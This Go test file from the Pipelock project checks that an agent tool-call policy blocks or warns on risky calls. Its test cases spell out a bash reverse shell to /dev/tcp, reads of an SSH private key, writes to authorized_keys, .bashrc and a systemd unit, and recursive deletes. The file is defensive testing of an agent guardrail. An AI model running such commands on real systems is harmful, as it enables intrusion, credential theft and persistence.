// Copyright 2026 Pipelock contributors
// SPDX-License-Identifier: Apache-2.0

package presets

import (
	"encoding/json"
	"slices"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
	"github.com/luckyPipewrench/pipelock/internal/mcp/policy"
)

// DefaultToolPolicyRules defines explicit blocking exceptions independently of
// the audit fallback. Exercise their matcher along with ordinary warn findings.
func checkAuditToolPolicyActions(t *testing.T, cfg *config.Config) {
	t.Helper()
	pc := policy.New(cfg.MCPToolPolicy)
	if pc == nil {
		t.Fatal("audit tool policy is unavailable")
	}
	for _, tc := range []struct {
		name, tool, args, rule, action string
	}{
		{"destructive delete", "bash", `{"command":"rm -rf /workspace/build"}`, "Destructive File Delete", config.ActionBlock},
		{"credential read", "read_file", `{"path":"/home/agent/.ssh/id_rsa"}`, "Credential File Access", config.ActionBlock},
		{"credential write", "write_file", `{"path":"/home/agent/.ssh/authorized_keys","content":"placeholder"}`, "Credential File Write", config.ActionBlock},
		{"reverse shell", "bash", `{"command":"bash -i >& /dev/tcp/192.0.2.1/4444"}`, "Reverse Shell", config.ActionBlock},
		{"protected delete", "delete_file", `{"path":"/etc/systemd/system/example.service"}`, "Protected Path Delete", config.ActionBlock},
		{"persistence write", "write_file", `{"path":"/etc/systemd/system/example.service","content":"placeholder"}`, "Persistence Path Write", config.ActionBlock},
		{"profile write", "write_file", `{"path":"/home/agent/.bashrc","content":"placeholder"}`, "Shell Profile Modification", config.ActionBlock},
		{"ordinary permission finding", "bash", `{"command":"chmod -R 777 /workspace/build"}`, "Recursive Permission Change", config.ActionWarn},
		{"ordinary install finding", "bash", `{"command":"npm install example-package"}`, "Package Install", config.ActionWarn},
		{"safe command", "bash", `{"command":"printf hello"}`, "", ""},
		{"safe file", "read_file", `{"path":"/workspace/README.md"}`, "", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := pc.CheckToolCallWithArgs(tc.tool, []string{tc.args}, json.RawMessage(tc.args))
			if tc.rule == "" {
				if got.Matched {
					t.Fatalf("safe call matched: %+v", got)
				}
				return
			}
			if !got.Matched || got.Action != tc.action || !slices.Contains(got.Rules, tc.rule) {
				t.Fatalf("policy verdict=%+v, want %s for %s", got, tc.action, tc.rule)
			}
		})
	}
}
